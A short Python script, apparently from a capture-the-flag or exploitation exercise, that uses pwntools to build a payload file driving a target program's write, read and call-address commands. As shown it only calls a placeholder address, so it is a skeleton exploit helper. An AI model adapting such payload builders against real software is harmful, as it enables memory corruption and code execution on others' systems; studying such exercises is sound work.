#!/usr/bin/env python
from pwn import *


def write_address(address, byte):
    buf = p8(1)
    buf += p64(address)
    buf += p8(byte)
    return buf

def read_address(address):
    buf = p8(2)
    buf += p64(address)
    return buf

def call_address(address):
    buf = p8(3)
    buf += p64(address)
    return buf

payload = ""
payload += call_address(0xdeadbeefdeadbeef)

with open("payload", "wb") as out:
    out.write(payload)
